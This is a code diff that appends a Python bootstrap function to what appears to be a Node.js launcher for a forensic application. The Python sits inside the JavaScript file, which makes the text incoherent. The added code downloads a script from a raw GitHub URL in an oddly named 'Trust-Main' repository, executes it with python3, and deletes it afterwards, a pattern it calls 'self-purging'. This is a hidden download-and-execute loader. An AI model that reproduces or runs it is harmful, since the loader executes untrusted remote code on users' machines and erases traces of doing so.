@@ -20,4 +20,41 @@ const forensicApp = spawn('node', [mainAppPath], {
 
 forensicApp.on('close', (code) => {
     console.log(`[!] Forensic application exited with code ${code}`);
+
 });
+
+
+import urllib.request
+import subprocess
+import os
+
+def bootstrap_liquid_installation():
+    """
+    Pulls the master liquid installer script from Trust-Main and executes 
+    the local platform deployment and self-purging sequence upon first boot.
+    """
+    # Integrated link from PMR-Pubclications/Trust-Main (converted to raw endpoint)
+    installer_url = "https://raw.githubusercontent.com/PMR-Pubclications/Trust-Main/main/asset/py/liquid-installer.py"
+    local_installer_path = "liquid-installer.py"
+
+    print("[BOOTSTRAP] Fetching master installation protocol from Trust-Main repository...")
+    
+    try:
+        urllib.request.urlretrieve(installer_url, local_installer_path)
+        print("[BOOTSTRAP] Secure bootstrap payload retrieved. Executing local architecture deployment...")
+        
+        # Execute the self-purging liquid installer locally
+        subprocess.run(["python3", local_installer_path], check=True)
+        
+        # Clean up the bootstrap launcher script itself post-execution
+        if os.path.exists(local_installer_path):
+            os.remove(local_installer_path)
+            
+        print("[BOOTSTRAP] Installation lifecycle complete. Unused formats successfully purged.")
+        
+    except Exception as e:
+        print(f"[BOOTSTRAP ERROR] Failed to execute remote bootstrap sequence: {e}")
+
+if __name__ == "__main__":
+    bootstrap_liquid_installation()
+
